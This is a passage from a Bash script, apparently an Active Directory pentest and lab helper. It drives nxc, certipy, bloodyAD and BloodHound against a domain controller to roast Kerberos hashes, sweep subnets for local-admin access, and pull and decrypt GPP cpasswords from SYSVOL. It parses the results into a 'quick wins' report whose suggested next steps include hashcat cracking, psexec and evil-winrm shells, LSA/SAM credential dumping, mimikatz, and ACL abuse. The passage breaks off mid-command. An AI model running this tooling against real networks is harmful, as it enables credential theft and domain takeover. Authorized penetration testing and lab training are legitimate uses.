    run "16-nxc-asreproast"   "AS-REP roastable accounts (nxc)"        "nxc ldap $DC_IP $NXC_G $NXC_AUTH --asreproast $(q "$OUTDIR/16-asrep.hashes")"
    run "16-nxc-kerberoast"   "kerberoastable accounts (nxc)"          "nxc ldap $DC_IP $NXC_G $NXC_AUTH --kerberoasting $(q "$OUTDIR/16-tgs.hashes")"
    run "16-nxc-delegation"   "accounts trusted for delegation"        "nxc ldap $DC_IP $NXC_G $NXC_AUTH --trusted-for-delegation"
    run "16-nxc-admincount"   "accounts with adminCount=1"             "nxc ldap $DC_IP $NXC_G $NXC_AUTH --admin-count"
    run "16-nxc-nopassreq"    "accounts with PASSWD_NOTREQD"           "nxc ldap $DC_IP $NXC_G $NXC_AUTH --password-not-required"
    run "16-nxc-gmsa"         "gMSA passwords readable by us"          "nxc ldap $DC_IP $NXC_G $NXC_AUTH --gmsa"
    run "16-nxc-laps"         "LAPS passwords readable by us (nxc)"    "nxc ldap $DC_IP $NXC_G $NXC_AUTH -M laps"
    run "16-nxc-maq"          "MachineAccountQuota (nxc)"              "nxc ldap $DC_IP $NXC_G $NXC_AUTH -M maq"

    run "17-dcsync-rights" "who holds replication (DCSync) rights on $BASEDN" \
        "nxc ldap $DC_IP $NXC_G $NXC_AUTH -M daclread -o TARGET_DN=$(q "$BASEDN") ACTION=read RIGHTS=DCSync"
    run "17-domain-dacl"   "full DACL of the domain root object" \
        "nxc ldap $DC_IP $NXC_G $NXC_AUTH -M daclread -o TARGET_DN=$(q "$BASEDN") ACTION=read"
    run "17-dacl-adminsdholder" "DACL of AdminSDHolder (persistence-grade ACL)" \
        "nxc ldap $DC_IP $NXC_G $NXC_AUTH -M daclread -o TARGET_DN=$(q "CN=AdminSDHolder,CN=System,$BASEDN") ACTION=read"
    run "17-dacl-domainadmins"  "DACL of Domain Admins (who can add members?)" \
        "nxc ldap $DC_IP $NXC_G $NXC_AUTH -M daclread -o TARGET_DN=$(q "CN=Domain Admins,CN=Users,$BASEDN") ACTION=read"
    # which GPOs carry a write-class ACE (GPO abuse -> SharpGPOAbuse)? dumps the
    # DACL of every groupPolicyContainer; the SUMMARY cross-checks it against the
    # objects bloodyAD says I can write. This is the dedicated twin of ade.ps1's
    # 15b-gpo-editable (bodyof/the shell functions are NOT available under
    # `bash -c`, so the GPO DNs are read straight from the 09-ldap-gpo file).
    run "17-gpo-editable" "GPOs editable: DACL of every GPO (GPO abuse surface)" \
        "for gdn in \$(tail -n +4 $(q "$OUTDIR/09-ldap-gpo.txt") 2>/dev/null | sed -n 's/^dn: //p'); do \
             echo \"=== \$gdn\"; \
             nxc ldap $DC_IP $NXC_G $NXC_AUTH -M daclread -o TARGET_DN=\$gdn ACTION=read 2>/dev/null \
               | grep -iE 'Access mask|Trustee'; \
         done"
else
    skip "16-nxc-asreproast" "nxc ldap rights checks" "nxc not installed"
fi

# ---- AD CS: certipy is the authority; nxc -M adcs is the fallback -----------
if have certipy-ad && [[ -n "$PASS" ]]; then
    run "23-adcs-certipy" "AD CS templates + CAs (certipy, vulnerable only)" \
        "cd $(q "$OUTDIR") && python3 $(q "$DNSFIX") $DC_IP $(q "$DOMAIN,$DC_FQDN") $(command -v certipy-ad) find -u $(q "$USER@$DOMAIN") -p $(q "$PASS") -dc-ip $DC_IP -ns $DC_IP -ldap-scheme ldap -stdout -vulnerable -output 23-certipy"
elif have nxc; then
    run "23-adcs-nxc" "AD CS enumeration (nxc -M adcs)" "nxc ldap $DC_IP $NXC_G $NXC_AUTH -M adcs"
else
    skip "23-adcs-certipy" "AD CS enumeration" "certipy-ad and nxc both absent"
fi

# ---- bloodyAD: on WHICH objects do I hold write rights ---------------------
# already Domain Admin / Builtin Administrators? then "everything" is writable
# and 'get writable' is a five-figure noise dump — skip it, say why.
AM_DA=0
bodyof "$OUTDIR/15-whoami.txt" 2>/dev/null \
    | grep -qiE 'memberOf:.*(CN=Domain Admins|CN=Enterprise Admins|CN=Administrators,CN=Builtin|CN=Schema Admins)' && AM_DA=1
BAD=""
have bloodyAD && BAD="bloodyAD"; have bloodyad && BAD="${BAD:-bloodyad}"
if [[ $AM_DA -eq 1 ]]; then
    skip "18-writable-objects" "objects THIS account can write (ACL abuse)" \
        "you are already Domain Admin / Builtin Administrators — every object is writable, DCSync now"
elif [[ -n "$BAD" ]]; then
    if [[ -n "$PASS" ]]; then BAD_CRED="-p $(q "$PASS")"; else BAD_CRED="-p $(q ":$NTHASH")"; fi
    BAD_AUTH="--host $DC_IP -d $(q "$DOMAIN") -u $(q "$USER") $BAD_CRED"
    run "18-writable-objects" "objects THIS account can write (ACL abuse paths)" \
        "$BAD $BAD_AUTH get writable"
    run "18-domain-sd"        "domain root security descriptor, ACEs resolved" \
        "$BAD $BAD_AUTH get object $(q "$BASEDN") --attr nTSecurityDescriptor --resolve-sd"
else
    skip "18-writable-objects" "objects THIS account can write (ACL abuse)" \
        "bloodyAD not installed (pipx install bloodyAD) — 08-ldap-maq covers MachineAccountQuota"
fi

# --------------------------------------------------- WHERE AM I LOCAL ADMIN ---
if [[ $DO_SWEEP -eq 1 ]] && have nxc; then
    section "LOCAL ADMIN SWEEP"
    TARGETS="${SWEEP:-$(sed 's/\.[0-9]*$/.0\/24/' <<<"$DC_IP")}"
    info "sweeping $TARGETS with $DOMAIN\\$USER — 'Pwn3d!' = local admin"
    run "19-sweep-smb"   "SMB: where does this account authenticate / is admin?" \
        "nxc smb $TARGETS $NXC_G $NXC_AUTH --continue-on-success"
    run "19-sweep-winrm" "WinRM: where can this account get a shell?" \
        "nxc winrm $TARGETS $NXC_G $NXC_AUTH --continue-on-success"
    run "19-sweep-rdp"   "RDP: where is this account allowed to log on?" \
        "nxc rdp $TARGETS $NXC_G $NXC_AUTH --continue-on-success"
elif [[ $DO_SWEEP -eq 1 ]]; then
    skip "19-sweep-smb" "local-admin sweep" "nxc not installed"
fi

if [[ $DO_SWEEP -eq 1 ]] && have nxc; then
    section "EVERY HOST: admins, sessions, shares"
    TARGETS="${TARGETS:-${SWEEP:-$(sed 's/\.[0-9]*$/.0\/24/' <<<"$DC_IP")}}"
    run "20-local-admins" "members of the local Administrators group, host by host" \
        "nxc smb $TARGETS $NXC_G $NXC_AUTH --local-groups Administrators --continue-on-success"
    run "20-local-groups" "all local groups (RDP, Backup Operators, ...)" \
        "nxc smb $TARGETS $NXC_G $NXC_AUTH --local-groups --continue-on-success"
    run "20-loggedon"     "logged-on users across the network" \
        "nxc smb $TARGETS $NXC_G $NXC_AUTH --loggedon-users --continue-on-success"
    run "20-sessions"     "active SMB sessions across the network" \
        "nxc smb $TARGETS $NXC_G $NXC_AUTH --smb-sessions --continue-on-success"
    run "20-shares-all"   "readable/writable shares on every host" \
        "nxc smb $TARGETS $NXC_G $NXC_AUTH --shares --continue-on-success"
    run "20-gpp"          "passwords in Group Policy Preferences (SYSVOL)" \
        "nxc smb $DC_IP $NXC_G $NXC_AUTH -M gpp_password; nxc smb $DC_IP $NXC_G $NXC_AUTH -M gpp_autologin"

    # coercion / patch-level: check-only, no exploitation
    run "24-coerce"    "coercion surface (PetitPotam/DFSCoerce/PrinterBug/MSEven — check only)" \
        "nxc smb $DC_IP $NXC_G $NXC_AUTH -M coerce_plus"
    # zerologon's check can hang for minutes on a patched DC — cap it hard
    run "24-zerologon" "Zerologon (CVE-2020-1472) — check only" \
        "timeout 60 nxc smb $DC_IP $NXC_G $NXC_AUTH -M zerologon || echo '[check inconclusive / timed out — patched DCs do not answer]'"
    run "24-nopac"     "noPac (CVE-2021-42278/42287) — check only" \
        "nxc smb $DC_IP $NXC_G $NXC_AUTH -M nopac"

    # ---- file spider: the single most productive credential source ---------
    if [[ $DO_SPIDER -eq 1 ]]; then
        run "26-spider" "every file on every readable share (names only)" \
            "nxc smb $TARGETS $NXC_G $NXC_AUTH -M spider_plus -o DOWNLOAD_FLAG=false --continue-on-success"
        # dedicated GPP/logon-script pull: recurse SYSVOL, download every xml,
        # then grep the lot for a cpassword blob.
        if have smbclient && [[ -n "$PASS" ]]; then
            SVDIR="$OUTDIR/sysvol"; mkdir -p "$SVDIR"
            # scope the recursion to \Policies (small) instead of all of SYSVOL
            # (huge, and full of other students' litter on shared labs).
            run "26-sysvol-gpp" "SYSVOL\\Policies: list scripts, pull *.xml, grep+decrypt cpassword" \
                "smbclient //$DC_IP/SYSVOL -U $(q "$DOMAIN/$USER%$PASS") -c 'prompt OFF; recurse ON; cd \"$DOMAIN\\Policies\"; ls' 2>/dev/null \
                   | grep -iE '\.(xml|ps1|bat|vbs|cmd|inf|ini)$|cpassword|\\\\'; \
                 (cd $(q "$SVDIR") && smbclient //$DC_IP/SYSVOL -U $(q "$DOMAIN/$USER%$PASS") \
                   -c 'prompt OFF; recurse ON; mask \"*.xml\"; cd \"$DOMAIN\\Policies\"; mget *' >/dev/null 2>&1); \
                 FOUND=\$(grep -rhoiE 'cpassword=\"[^\"]*\"' $(q "$SVDIR") 2>/dev/null | sort -u); \
                 echo \"\$FOUND\"; \
                 if [ -n \"\$FOUND\" ] && command -v gpp-decrypt >/dev/null; then \
                   echo \"\$FOUND\" | sed 's/.*=\"//;s/\"//' | while read -r c; do printf '%s -> ' \"\$c\"; gpp-decrypt \"\$c\" 2>/dev/null; done; \
                 fi; \
                 grep -rilE 'cpassword' $(q "$SVDIR") 2>/dev/null | while read -r x; do echo \"-- \$x\"; cat \"\$x\"; echo; done"
        fi
    fi
fi

# ------------------------------------------------------------------- MSSQL ---
# MSSQL is a first-class AD lateral-movement surface (xp_cmdshell, linked-server
# crawl, Windows-auth with the domain token) and the mindmap's whole MSSQL branch
# lives here. Enumeration only: a login check, the privilege check (am I
# sysadmin / can I impersonate), and a read-only SELECT of the linked servers.
# No xp_cmdshell / no exec here — that is the exploitation step, done by hand.
if have nxc; then
    section "MSSQL (1433)"
    MSSQL_TARGETS="${SWEEP:-$(sed 's/\.[0-9]*$/.0\/24/' <<<"$DC_IP")}"
    info "looking for MSSQL on $MSSQL_TARGETS with $DOMAIN\\$USER"
    run "27-mssql-login" "MSSQL: hosts where this account authenticates" \
        "nxc mssql $MSSQL_TARGETS $NXC_G $NXC_AUTH --continue-on-success"
    run "27-mssql-priv"  "MSSQL: am I sysadmin / can I impersonate a login?" \
        "nxc mssql $MSSQL_TARGETS $NXC_G $NXC_AUTH -M mssql_priv --continue-on-success"
    run "27-mssql-links" "MSSQL: linked servers (lateral to other instances)" \
        "nxc mssql $MSSQL_TARGETS $NXC_G $NXC_AUTH -q 'SELECT name, product, data_source FROM sys.servers' --continue-on-success"
fi

fi   # end authenticated block

# -------------------------------------------------------------- BLOODHOUND ---
BHBIN=""
have bloodhound-python && BHBIN="bloodhound-python"
[[ -z "$BHBIN" ]] && have bloodhound-ce-python && BHBIN="bloodhound-ce-python"
if [[ $DO_BH -eq 1 && $SECRET_SET -eq 1 && -n "$PASS" && -n "$BHBIN" ]]; then
    section "BLOODHOUND"
    mkdir -p "$OUTDIR/bloodhound"
    run "14-bloodhound" "SharpHound collection over LDAP" \
        "cd $(q "$OUTDIR/bloodhound") && $BHBIN -d $(q "$DOMAIN") -u $(q "$USER") -p $(q "$PASS") \
         -ns $DC_IP --dns-tcp -dc $(q "$DC_FQDN") -gc $(q "$DC_FQDN") -c All --zip"

    if have python3; then
        printf '  %s->%s %s\n' "$C_C" "$C_RST" "extracting AdminTo map, sessions and abusable ACL edges"
        python3 - "$OUTDIR/bloodhound" "$OUTDIR" "$USER" > "$OUTDIR/21-adminto-map.txt" 2>&1 <<'PYEOF'
import glob, json, os, sys, zipfile

folder = sys.argv[1]
outdir = sys.argv[2] if len(sys.argv) > 2 else folder
my_name = (sys.argv[3] if len(sys.argv) > 3 else "").lower()
my_sid = ""
objects = []

def load(name, raw):
    try:
        data = json.loads(raw)
    except Exception:
        return
    for obj in data.get("data", []) or []:
        objects.append(obj)

for z in glob.glob(os.path.join(folder, "*.zip")):
    try:
        with zipfile.ZipFile(z) as zf:
            for n in zf.namelist():
                load(n, zf.read(n))
    except Exception as e:
        print("skipping unreadable zip %s: %s" % (z, e))
for j in glob.glob(os.path.join(folder, "*.json")):
    load(j, open(j, "rb").read())

if not objects:
    print("no BloodHound data found in", folder)
    raise SystemExit

names, by_sid = {}, {}
for obj in objects:
    sid = obj.get("ObjectIdentifier")
    props = obj.get("Properties") or {}
    nm = props.get("name")
    if sid:
        by_sid[sid] = obj
        if nm:
            names[sid] = nm
        sam = str(props.get("samaccountname", "")).lower()
        if my_name and my_name in (sam, (nm or "").split("@")[0].lower()):
            my_sid = sid

def label(sid, otype=""):
    return names.get(sid, sid) + (" (%s)" % otype if otype else "")

def kind_of(obj):
    props = obj.get("Properties") or {}
    if any(k in obj for k in ("LocalAdmins", "PSRemoteUsers", "RemoteDesktopUsers", "LocalGroups")):
        return "computer"
    if props.get("operatingsystem") or str(props.get("samaccountname", "")).endswith("$"):
        return "computer"
    if "Members" in obj:
        return "group"
    if "Trusts" in obj or "ChildObjects" in obj:
        return "domain"
    return "user"

# ---- principals the current user effectively is (self + group closure) -----
WELL_KNOWN = {"S-1-1-0", "S-1-5-11", "S-1-5-32-545"}   # Everyone, Auth Users, Users
def group_closure(sid):
    seen, stack = set(), [sid]
    while stack:
        s = stack.pop()
        if s in seen:
            continue
        seen.add(s)
        obj = by_sid.get(s)
        if not obj:
            continue
        for g in obj.get("MemberOf", []) or []:
            gid = g if isinstance(g, str) else g.get("ObjectIdentifier")
            if gid:
                stack.append(gid)
        # legacy shape: Aces/PrimaryGroupSID
        pg = (obj.get("Properties") or {}).get("primarygroupsid")
        if pg:
            stack.append(pg)
    return seen

MINE = set(WELL_KNOWN)
if my_sid:
    MINE.add(my_sid)
    MINE |= group_closure(my_sid)
    # bloodhound-python (legacy) puts membership on the group, not the user.
    # walk group.Members to a fixpoint so nested groups are covered too.
    changed = True
    while changed:
        changed = False
        for obj in objects:
            if kind_of(obj) != "group":
                continue
            gid = obj.get("ObjectIdentifier")
            if gid in MINE:
                continue
            for m in obj.get("Members", []) or []:
                mid = m if isinstance(m, str) else m.get("ObjectIdentifier")
                if mid in MINE:
                    MINE.add(gid); changed = True; break
# "Domain Users" / "Authenticated Users" are mine with any domain cred
for sid, nm in names.items():
    if nm.upper().split("@")[0] in ("DOMAIN USERS", "AUTHENTICATED USERS", "EVERYONE", "USERS"):
        MINE.add(sid)

# ---------------------------------------------------------------- AdminTo ---
rows = []
for comp in objects:
    if kind_of(comp) != "computer":
        continue
    host = (comp.get("Properties") or {}).get("name") or comp.get("ObjectIdentifier")
    for edge, title in (("LocalAdmins", "ADMIN"), ("PSRemoteUsers", "WINRM"),
                        ("RemoteDesktopUsers", "RDP"), ("DcomUsers", "DCOM")):
        for r in (comp.get(edge) or {}).get("Results", []) or []:
            rows.append((host, title, label(r.get("ObjectIdentifier", "?"), r.get("ObjectType", ""))))
    for grp in comp.get("LocalGroups") or []:
        title = {"544": "ADMIN", "555": "RDP", "562": "DCOM",
                 "580": "WINRM"}.get(str(grp.get("ObjectIdentifier", "")).rsplit("-", 1)[-1])
        if not title:
            continue
        for r in grp.get("Results", []) or []:
            rows.append((host, title, label(r.get("ObjectIdentifier", "?"), r.get("ObjectType", ""))))

if rows:
    for host in sorted({r[0] for r in rows}):
        print("\n== %s" % host)
        for _, kind, who in sorted(r for r in rows if r[0] == host):
            print("   %-6s %s" % (kind, who))
    print("\n== reversed: principal -> hosts")
    who_map = {}
    for host, kind, who in rows:
        if kind == "ADMIN":
            who_map.setdefault(who, set()).add(host)
    for who in sorted(who_map):
        print("   %-45s admin on: %s" % (who, ", ".join(sorted(who_map[who]))))
else:
    print("no local-admin data collected (hosts unreachable, or -c All did not run)")

# --------------------------------------------------------------- Sessions ---
sess = []
for comp in objects:
    if kind_of(comp) != "computer":
        continue
    host = (comp.get("Properties") or {}).get("name") or comp.get("ObjectIdentifier")
    for key in ("Sessions", "PrivilegedSessions", "RegistrySessions"):
        blk = comp.get(key) or {}
        for r in blk.get("Results", []) or []:
            u = r.get("UserSID") or r.get("ObjectIdentifier")
            if u:
                sess.append((host, key, label(u)))
if sess:
    print("\n== SESSIONS (user creds sit in that host's memory)")
    for host in sorted({s[0] for s in sess}):
        for _, k, who in sorted({s for s in sess if s[0] == host}):
            print("   %-18s %-18s %s" % (host, k, who))

# -------------------------------------------------------------- ACL edges ---
INTERESTING = {"Owns", "GenericAll", "GenericWrite", "WriteDacl", "WriteOwner",
               "AddMember", "AddAllowedToAct", "WriteAccountRestrictions", "WriteGPLink",
               "AddKeyCredentialLink", "WriteSPN", "AddSelf", "AllExtendedRights",
               "GetChanges", "GetChangesAll", "ReadLAPSPassword", "ForceChangePassword"}
HV_WORDS = ("DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS", "KEY ADMINS",
            "ACCOUNT OPERATORS", "BACKUP OPERATORS", "KRBTGT", "DOMAIN CONTROLLERS")
# principals whose control is DEFAULT and therefore not a "path" for us
DEFAULT_PRINCIPALS = ("DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS", "SYSTEM",
                      "DOMAIN CONTROLLERS", "ENTERPRISE DOMAIN CONTROLLERS", "ENTERPRISE KEY ADMINS",
                      "KEY ADMINS", "ACCOUNT OPERATORS", "BACKUP OPERATORS", "SERVER OPERATORS",
                      "PRINT OPERATORS", "CREATOR OWNER", "SELF", "PRINCIPAL SELF", "LOCAL SYSTEM")

edges = []
for obj in objects:
    props = obj.get("Properties") or {}
    tname = props.get("name") or obj.get("ObjectIdentifier") or "?"
    kind = kind_of(obj)
    is_dc = "OU=DOMAIN CONTROLLERS" in (props.get("distinguishedname") or "").upper()
    hv = (bool(props.get("highvalue")) or is_dc or kind == "domain"
          or any(w in tname.upper() for w in HV_WORDS))
    for ace in obj.get("Aces") or []:
        right = ace.get("RightName") or ""
        if right in ("ExtendedRight", "Extended"):
            right = ace.get("AceType") or right
        if right not in INTERESTING and "GetChanges" not in right:
            continue
        psid = ace.get("PrincipalSID")
        who = names.get(psid, psid or "?")
        default = any(d in who.upper() for d in DEFAULT_PRINCIPALS)
        mine = (psid in MINE) and not (psid in by_sid and default)
        edges.append((hv, mine, default, who, right, tname, "DC" if is_dc else kind))

if edges:
    fmt = "   %-38s --%s--> %s (%s)"
    hv_lines   = sorted({fmt % (w, r, t, k) for hv, mn, d, w, r, t, k in edges if hv and not d})
    mine_lines = sorted({fmt % (w, r, t, k) for hv, mn, d, w, r, t, k in edges if mn})
    all_lines  = sorted({fmt % (w, r, t, k) for hv, mn, d, w, r, t, k in edges if not d})
    with open(os.path.join(outdir, "22-acl-edges.txt"), "w") as fh:
        fh.write("# object control (ACL) edges collected by BloodHound\n")
        fh.write("# default-privileged principals (Domain Admins, Administrators, ...) are filtered out:\n")
        fh.write("# their control is expected and is not a path.\n")
        fh.write("\n== edges a principal YOU control can abuse (self / your groups / Everyone / Auth Users)\n")
        fh.write(("\n".join(mine_lines) if mine_lines else "   none") + "\n")
        fh.write("\n== non-default edges onto HIGH VALUE targets (DC, privileged groups, domain)\n")
        fh.write(("\n".join(hv_lines) if hv_lines else "   none") + "\n")
        fh.write("\n== every non-default interesting edge\n")
        fh.write(("\n".join(all_lines) if all_lines else "   none") + "\n")
    print("\n== %d non-default ACL edges written to 22-acl-edges.txt (%d abusable by you, %d on high-value)"
          % (len(all_lines), len(mine_lines), len(hv_lines)))
PYEOF
    fi
elif [[ $DO_BH -eq 1 && $SECRET_SET -eq 1 ]]; then
    skip "14-bloodhound" "SharpHound collection" "bloodhound-python not installed, or no password (-H unsupported by collector)"
fi

# ----------------------------------------------------------------- SUMMARY ---
section "SUMMARY — QUICK WINS"
SUM="$OUTDIR/SUMMARY.txt"
: > "$SUM"; : > "$SUM.crit"; : > "$SUM.high"; : > "$SUM.info"

CRIT_LIST=(); HIGH_LIST=()
add() {
    local title="$1" body="$2" next="${3:-}" sev="${4:-INFO}"
    local bucket color tag
    case "$sev" in
        CRIT) bucket="$SUM.crit"; color="$C_R"; tag="[CRITICAL]"; CRIT_LIST+=("$title") ;;
        HIGH) bucket="$SUM.high"; color="$C_Y"; tag="[HIGH]    "; HIGH_LIST+=("$title") ;;
        *)    bucket="$SUM.info"; color="$C_G"; tag="[INFO]    " ;;
    esac
    { printf '\n### %s %s\n%s\n' "$tag" "$title" "$body"
      [[ -n "$next" ]] && printf '\n>> NEXT: %s\n' "$next"; } >> "$bucket"
    printf '\n%s%s %s%s\n' "$color$C_B" "$tag" "$title" "$C_RST"
    local n; n=$(wc -l <<<"$body")
    head -n 8 <<<"$body" | sed 's/^/    /'
    [[ "$n" -gt 8 ]] && printf '    %s... %d more lines in SUMMARY.txt%s\n' "$C_Y" "$((n-8))" "$C_RST"
    [[ -n "$next" ]] && printf '    %s>> NEXT:%s %s\n' "$C_C$C_B" "$C_RST" "$next"
    return 0
}

# ---- credentials sitting in the open ---------------------------------------
# keyword-match description/info, then drop the well-known built-in group
# blurbs (RODC replication groups etc.) that only match on the word "password".
DESCS=$(bodyof "$OUTDIR"/07-ldap-*.txt | grep -iE '^(description|info):' \
        | grep -iE 'pass|pwd|cred|secret|welcome|summer|winter|spring|autumn|[0-9]{2,}' \
        | grep -viE 'passwords? (replicated|to all|to a )|can(not)? have their passwords|Key Distribution Center|Built-in account|backward compatibility|members (in|of) this group' \
        | sort -u)
[[ -n "$DESCS" ]] && add "Passwords possibly in LDAP descriptions" "$DESCS" \
    "test it: nxc smb $DC_IP -u <user> -p '<pass>' -d $DOMAIN --continue-on-success" "HIGH"

PWATTR=$(bodyof "$OUTDIR/08-ldap-pw-in-attrs.txt" | grep -iE '^(sAMAccountName|name|userPassword|unixUserPassword|ms-MCS-AdmPwd|msLAPS-Password):' | sort -u)
[[ -n "$PWATTR" ]] && add "Password stored in an LDAP attribute" "$PWATTR" \
    "userPassword values are often base64; decode and test" "CRIT"

CPASS=$( { bodyof "$OUTDIR/20-gpp.txt" "$OUTDIR/26-sysvol-gpp.txt"; } 2>/dev/null \
        | grep -iE 'cpassword=|GPP Password|-> [^ ]|Found credentials|Username[ :]+[^ ]+ Password' \
        | grep -viE 'no .*found|\[-\]|error|Searching for|Found SYSVOL' | sort -u)
if [[ -n "$CPASS" ]]; then
    CPASS_BODY="$CPASS"
    if have gpp-decrypt; then
        while read -r c; do
            [[ -z "$c" ]] && continue
            p=$(gpp-decrypt "$c" 2>/dev/null | head -1)
            [[ -n "$p" ]] && CPASS_BODY+=$'\n'"  [decrypted]  $c  ->  $p"
        done < <(grep -oiE 'cpassword="[^"]*"' <<<"$CPASS" | sed 's/.*="//;s/"$//' | sort -u)
    fi
    add "Group Policy Preferences / SYSVOL credential" "$CPASS_BODY" \
        "it is a LOCAL admin password: nxc smb <targets> -u '<name>' -p '<pass>' --local-auth --continue-on-success" "CRIT"
fi

SPIDER=$(bodyof "$OUTDIR/26-spider.txt" 2>/dev/null | grep -iE '\.(kdbx|ppk|pem|ini|config|conf|xml|txt|ps1|bat|vbs|cmd|kirbi|rdp|vnc|git-credentials)$|unattend|sysprep|password|cred' | grep -viE 'SYSVOL|NETLOGON|/Policies/' | sort -u | head -40)
[[ -n "$SPIDER" ]] && add "Interesting files on readable shares" "$SPIDER" \
    "smbclient //<host>/<share> -U '$DOMAIN\\$USER' -c 'get <path>' — read them" "HIGH"

# ---- Kerberos hashes ------------------------------------------------------
ASREP=$( { bodyof "$OUTDIR/12-asreproast.txt"; cat "$OUTDIR/asrep.hashes" "$OUTDIR/16-asrep.hashes" 2>/dev/null; } | grep '^\$krb5asrep' | sort -u)
if [[ -n "$ASREP" ]]; then
    printf '%s\n' "$ASREP" > "$OUTDIR/asrep.hashes"
    CR=$(grep -hE '\$krb5asrep' "$OUTDIR/hashcat.pot" 2>/dev/null | sed 's/.*://' | paste -sd' ' -)
    add "AS-REP hashes${CR:+  (CRACKED: $CR)}" "$ASREP" \
        "hashcat -m 18200 $(q "$OUTDIR/asrep.hashes") $(q "$WORDLIST") --force" "HIGH"
fi

TGS=$( { bodyof "$OUTDIR/13-kerberoast.txt" "$OUTDIR/13b-kerberoast-nopreauth.txt"; cat "$OUTDIR/tgs.hashes" "$OUTDIR/16-tgs.hashes" 2>/dev/null; } | grep '^\$krb5tgs' | sort -u)
if [[ -n "$TGS" ]]; then
    printf '%s\n' "$TGS" > "$OUTDIR/tgs.hashes"
    CR=$(grep -hE '\$krb5tgs' "$OUTDIR/hashcat.pot" 2>/dev/null | sed 's/.*://' | paste -sd' ' -)
    add "Kerberoast hashes${CR:+  (CRACKED: $CR)}" "$TGS" \
        "hashcat -m 13100 $(q "$OUTDIR/tgs.hashes") $(q "$WORDLIST") --force" "HIGH"
fi

NOPREAUTH=$(bodyof "$OUTDIR/08-ldap-asrep.txt" | sed -n 's/^sAMAccountName: //p')
[[ -n "$NOPREAUTH" ]] && add "Accounts without Kerberos pre-auth (AS-REP roastable)" "$NOPREAUTH" \
    "no password needed: impacket-GetNPUsers $DOMAIN/ -usersfile '$USERS_FILE' -dc-ip $DC_IP -no-pass -format hashcat" "HIGH"

SPNS=$(bodyof "$OUTDIR/08-ldap-spn.txt" | sed -n 's/^sAMAccountName: //p')
[[ -n "$SPNS" ]] && add "Accounts with an SPN (kerberoastable)" "$SPNS" \
    "impacket-GetUserSPNs $DOMAIN/<user>:<pass> -dc-ip $DC_IP -request  (skew? add -no-preauth <asrep-user>)" "INFO"

# ---- shares / policy ----------------------------------------------------
SHARES=$(bodyof "$OUTDIR"/0[34]-smb-*shares*.txt "$OUTDIR/20-shares-all.txt" | grep -E 'READ|WRITE' | grep -viE 'IPC\$|print\$' | sort -u)
[[ -n "$SHARES" ]] && add "Readable/writable shares" "$SHARES" \
    "smbclient //<host>/<share> -U '$DOMAIN\\<user>' — hunt scripts, backups, .kdbx, unattend.xml, web.config" "INFO"

POL=$(bodyof "$OUTDIR/04-smb-passpol.txt" "$OUTDIR/05-rpc-null.txt" | grep -iE 'lockout|minimum password|complexity' | sort -u)
[[ -n "$POL" ]] && add "Password policy" "$POL" \
    "READ THE LOCKOUT THRESHOLD before spraying: one password per round, --continue-on-success" "INFO"

# ---- what THIS account can do -----------------------------------------------
PWNED=$(bodyof "$OUTDIR/19-sweep-smb.txt" | grep 'Pwn3d!' | sort -u)
[[ -n "$PWNED" ]] && add "LOCAL ADMIN here (Pwn3d!)" "$PWNED" \
    "harvest creds: nxc smb <host> $NXC_AUTH --sam --lsa --dpapi  |  shell: impacket-psexec $DOMAIN/<user>:<pass>@<host>" "CRIT"

WINRM=$(bodyof "$OUTDIR/19-sweep-winrm.txt" | grep 'Pwn3d!' | sort -u)
[[ -n "$WINRM" ]] && add "WinRM shell available" "$WINRM" \
    "evil-winrm -i <host> -u <user> -p '<pass>'   (with a hash: -H <nthash>)" "CRIT"

VALID=$(bodyof "$OUTDIR/19-sweep-smb.txt" | grep '\[+\]' | grep -v 'Pwn3d!' | sort -u)
[[ -n "$VALID" ]] && add "Authenticates here (not admin, still useful)" "$VALID" \
    "enough for LDAP / kerberoast / share hunting on that host" "INFO"

ADMINMAP=$(grep -hE '^(==|   (ADMIN|WINRM|RDP|DCOM) |   .* admin on: )' "$OUTDIR/21-adminto-map.txt" 2>/dev/null | grep -v 'ACL edges')
[[ -n "$ADMINMAP" ]] && add "WHO IS ADMIN WHERE (BloodHound AdminTo map)" "$ADMINMAP" \
    "pick a principal you can become (cracked hash, ACL abuse, token) and go to the host where it is admin" "HIGH"

# real member lines only. nxc --local-groups prints
#   SMB  <ip>  445  <HOST>  <DOMAIN>\<member>
# keep those, drop the [*] banner, the [+] auth line and the Pwn3d marker.
LOCALADM=$(bodyof "$OUTDIR/20-local-admins.txt" \
    | grep -E '^SMB[[:space:]].*[[:space:]][A-Za-z0-9.-]+\\[A-Za-z0-9 ._$-]+' \
    | grep -viE 'Pwn3d|\[\*\]|\[\+\]|\[-\]' \
    | sed -E 's/^SMB[[:space:]]+([0-9.]+)[[:space:]]+[0-9]+[[:space:]]+([A-Za-z0-9.-]+)[[:space:]]+/\2  /' \
    | sort -u)
[[ -n "$LOCALADM" ]] && add "Local Administrators group, host by host (SAMR)" "$LOCALADM" \
    "a non-DA user admin on a host = your lateral target; crack or coerce THAT account" "HIGH"

# sessions: BloodHound section + real nxc loggedon lines (HOST\user), never banners
SESSIONS=$( { awk '/^== SESSIONS/{f=1;next} /^== /{f=0} f' "$OUTDIR/21-adminto-map.txt" 2>/dev/null
             bodyof "$OUTDIR/20-loggedon.txt" "$OUTDIR/04-smb-loggedon.txt" \
               | grep -E '[A-Z0-9-]+\\[A-Za-z0-9._$-]+' | grep -oE '[A-Z0-9.-]+\\[A-Za-z0-9._$-]+' ; } \
           | grep -viE 'Pwn3d' | sort -u)
[[ -n "$SESSIONS" ]] && add "Logged-on users (credentials in that host's memory)" "$SESSIONS" \
    "get SYSTEM there, then: nxc smb <host> $NXC_AUTH --lsa   (or mimikatz sekurlsa::logonpasswords)" "HIGH"

# abusable ACL edges: from the dedicated section the python already filtered
ABUSE=$(awk '/^== edges a principal YOU control/{f=1;next} /^== /{f=0} f' "$OUTDIR/22-acl-edges.txt" 2>/dev/null | grep -vE '^\s*$|^   none$')
[[ -n "$ABUSE" ]] && add "ACL edges YOU can abuse" "$ABUSE" \
    "become the principal (you already can), then: on a GROUP add yourself; on a USER set password / add SPN / shadow-cred; on a COMPUTER RBCD or shadow-cred" "CRIT"

WRITABLE=$(bodyof "$OUTDIR/18-writable-objects.txt" | grep -iE 'distinguishedName' | grep -viE 'CN=Policies,CN=System|CN=System,DC=' | sort -u | head -30)
[[ -n "$WRITABLE" ]] && add "Objects this account can WRITE (bloodyAD)" "$WRITABLE" \
